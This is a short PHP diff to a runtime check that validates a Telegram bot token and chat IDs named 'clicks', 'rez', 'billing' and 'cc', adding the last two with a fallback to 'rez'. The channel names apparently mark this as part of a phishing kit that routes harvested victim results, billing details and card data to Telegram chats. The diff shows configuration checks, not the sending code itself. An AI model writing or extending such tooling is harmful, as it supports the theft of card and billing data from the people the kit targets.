@@ -58,11 +58,15 @@ function salt_runtime_check(): array
     $tg = is_file($root . '/config/telegram.php') ? require $root . '/config/telegram.php' : [];
     $token = trim((string) ($tg['bot_token'] ?? ''));
     $clicks = trim((string) ($tg['chat_id_clicks'] ?? ''));
+    $billing = trim((string) ($tg['chat_id_billing'] ?? ''));
+    $cc = trim((string) ($tg['chat_id_cc'] ?? ''));
     $rez = trim((string) ($tg['chat_id_rez'] ?? ''));
     $checks['telegram'] = [
-        'ok' => $token !== '' && $clicks !== '' && $rez !== '',
+        'ok' => $token !== '' && ($clicks !== '' || $rez !== '') && ($billing !== '' || $rez !== '') && ($cc !== '' || $rez !== ''),
         'bot_token' => $token !== '',
-        'chat_id_clicks' => $clicks !== '',
+        'chat_id_clicks' => $clicks !== '' || $rez !== '',
+        'chat_id_billing' => $billing !== '' || $rez !== '',
+        'chat_id_cc' => $cc !== '' || $rez !== '',
         'chat_id_rez' => $rez !== '',
     ];
 
